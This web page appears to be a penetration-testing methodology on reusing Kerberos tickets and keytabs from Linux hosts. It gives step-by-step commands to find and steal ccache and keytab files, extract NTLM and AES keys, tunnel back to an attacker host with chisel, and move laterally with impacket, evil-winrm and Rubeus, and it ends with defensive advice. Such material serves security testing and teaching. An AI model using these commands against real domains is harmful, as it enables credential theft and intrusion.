---
layout: page
title: "Pass the Ticket from Linux"
subtitle: "Finding ccache and keytab files on Linux hosts and reusing Kerberos identities from attack tools"
permalink: /methodology/lateral-movement/pass-the-ticket-linux/
---

A Linux host joined to Active Directory, or one that simply runs Kerberos-aware scripts, stores its Kerberos credentials on disk. Those credentials come in two forms: ccache files, which hold tickets for a logged-on user, and keytab files, which hold long-term keys that scripts use to authenticate without a password. Finding either form lets you reuse an identity from your own tools. This page covers identifying the integration, locating the files, using them and converting them for Windows.

## 1. Confirm the Active Directory integration

The `realm` tool shows whether the host is enrolled in a domain and which users or groups may log on.

```bash
realm list
```

If `realm` is not installed, check whether a directory daemon is running. Winbind and SSSD are the two the notes name.

```bash
ps -ef | grep -i "winbind\|sssd"
```

## 2. Locate tickets and keytabs

The ccache path is stored in the `KRB5CCNAME` variable. Check it, then list the temporary directory, which is where ccache files are normally written.

```bash
env | grep -i krb5
ls -la /tmp
```

Keytab files usually have the `.keytab` or `.kt` extension, but scripts can use any name. Search the filesystem, and check the crontab of the current user, since scheduled scripts often call `kinit` with a keytab.

```bash
find / -name '*keytab*' -ls 2>/dev/null
crontab -l
```

A script found this way might contain:

```bash
kinit SERVICE_USER@DOMAIN -k -t KEYTAB_FILE
smbclient //DC_HOST/SHARE -k -no-pass -c 'ls'
```

## 3. Inspect and use a keytab

`klist -k` lists the principals stored in a keytab without using it. The keytab is then used with `kinit -k -t` to obtain a TGT for that principal.

```bash
klist -k -t KEYTAB_FILE
kinit USERNAME@DOMAIN -k -t KEYTAB_FILE
klist
smbclient //DC_HOST/SHARE -k -c 'ls'
```

Using a keytab needs read and write privileges on the file, as the notes point out. Keep a copy of the ccache file if you want to preserve your own session.

## 4. Extract hashes from a keytab

A keytab can be parsed to obtain the NTLM and AES keys of its principal. The notes used a helper script, which prints each key type it finds.

```bash
python3 keytabextract.py KEYTAB_FILE
```

The NTLM hash can be used for pass the hash. The AES keys can be used to forge tickets with Rubeus. If the account has a weak password, the NTLM hash may also be cracked offline.

## 5. Reuse another user's ccache file

Once you are root, you can read any ccache file in `/tmp`. Copy the file, point `KRB5CCNAME` at your copy and use it from your session.

```bash
klist
cp /tmp/CCACHE_FILE .
export KRB5CCNAME=/root/CCACHE_FILE
smbclient //DC_HOST/C$ -k -c 'ls' -no-pass
```

## 6. Use Kerberos-aware attack tools

Tools that support Kerberos read the ccache from `KRB5CCNAME`, so set it before running them. Kerberos needs the hostnames, so add the DC and the host to `/etc/hosts`.

```text
DC_IP   DC_HOST.DOMAIN   DC_HOST
```

If the domain is reachable only from a compromised host, route traffic through it. The notes use chisel, with a SOCKS listener on the attacker side and proxychains set to `socks5` on port 1080.

```bash
sudo ./chisel server --reverse
```

```cmd
chisel.exe client ATTACKER_IP:8080 R:socks
```

```bash
proxychains impacket-wmiexec DC_HOST -k -no-pass
```

Evil-WinRM needs the Kerberos client package and a realm definition in `/etc/krb5.conf`.

```bash
sudo apt-get install krb5-user -y
```

```text
[libdefaults]
    default_realm = DOMAIN

[realms]
    DOMAIN = {
        kdc = DC_HOST.DOMAIN
    }
```

```bash
proxychains evil-winrm -i DC_HOST -r DOMAIN
```

## 7. Convert between formats

A ccache file can be converted to `.kirbi` so Windows tools can import it.

```bash
impacket-ticketConverter CCACHE_FILE KIRBI_FILE
```

```cmd
C:\tools\Rubeus.exe ptt /ticket:KIRBI_FILE
```

## What to look for

- A `KRB5CCNAME` value that points at another user's ccache, or ccache files in `/tmp` owned by other principals.
- Keytab files and any script or crontab entry that calls `kinit -k -t`.
- The principal inside a keytab. A service principal often has more rights than a person.
- Expiry lines in `klist`, which show whether a ticket can still be used.

## Pitfalls

- Set `KRB5CCNAME` before each command. Without it, tools fall back to a default cache that holds your own ticket.
- A ccache file is only as good as its remaining lifetime. Check `klist` first.
- Do not run Kerberos tools with IP addresses. Use the names from `/etc/hosts` and `/etc/krb5.conf`.
- Proxychains commands fail silently when the SOCKS listener is down, so confirm the tunnel first.

## Defense

- Keep `/etc/krb5.keytab` readable only by root, which is its default.
- Store service keytabs in protected locations, not in user home directories or world-readable script folders.
- Review cron jobs that call `kinit -k -t`, and check that the keytab they use is not readable by other users.
- Remove ccache files when sessions end, and avoid leaving tickets in shared directories such as `/tmp`.
